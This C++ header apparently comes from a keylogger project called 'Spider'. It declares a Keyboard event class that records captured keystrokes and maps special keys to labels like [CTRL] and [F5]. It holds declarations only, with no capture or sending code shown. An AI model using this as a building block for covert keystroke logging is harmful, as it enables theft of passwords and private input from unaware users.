//!
//! \file IEvent.hpp
//! \author mliani
//! \date 30/09/2017
//!

#pragma once

#include <string>
#include <windows.h>
#include <unordered_map>
#include "Event/IEvent.hpp"

//!
//! \namesapce Spider
//!
namespace Spider
{
//!
//! \namespace Event
//!
namespace Event
{
	//!
	//! \class Keyboard
	//! \brief Keyboard Handler
	//!
	class Keyboard : public IEvent
	{
	private:
		std::string mKeys; //!< key register

		std::unordered_map<int, std::string>	mSpecialChar{
			{ VK_SHIFT, "[SHIFT]" },
			{ VK_CAPITAL, "[MAJ]" },
			{ VK_ESCAPE, "[ESC]" },
			{ VK_CONTROL, "[CTRL]" },
			{ VK_RETURN, "[ENT]" },
			{ VK_TAB, "[TAB]" },
			{ VK_BACK, "[BACK]" },
			{ VK_DELETE, "[DEL]" },
			{ VK_MENU, "[ALT]" },
			{ VK_F1, "[F1]" },
			{ VK_F2, "[F2]" },
			{ VK_F3, "[F3]" },
			{ VK_F4, "[F4]" },
			{ VK_F5, "[F5]" },
			{ VK_F6, "[F6]" },
			{ VK_F7, "[F7]" },
			{ VK_F8, "[F8]" },
			{ VK_F9, "[F9]" },
			{ VK_F10, "[F10]" },
			{ VK_F11, "[F11]" },
			{ VK_F12, "[F12]" }
		}; //!< map, assossiate special key to a string

	public:
		//!
		//! \brief Default constructor
		//! \param last activity register
		//!
		Keyboard(const std::string &activity) : IEvent(activity) {};
		//!
		//! \brief Default copy constructor
		//!
		Keyboard(const Keyboard &) = delete;
		//!
		//! \brief Operator equal overlaod
		//! \return Keyboard
		//!
		Keyboard	&operator=(const Keyboard &) = delete;
		//!
		//! \brief Default destroyer
		//!
		virtual ~Keyboard() = default;

	public:
		//!
		//! \brief Extract Keyboard information
		//! \return Informations into string format
		//!
		virtual std::string getEventInfo() const;
		//!
		//! \brief Get id of the event
		//! \return Request ID
		//!
		virtual inline int getId() const { return (4);}

	public:
		//!
		//! \brief save key catch by the keylogger
		//! \param last key register
		//!
		void	setKey(int key);
		//!
		//! \brief check if the key catch is a special character
		//! \param last key register
		//! \return true if it's a special char, overwise false
		//!
		bool	isSpecialChar(int key);
	};
}
}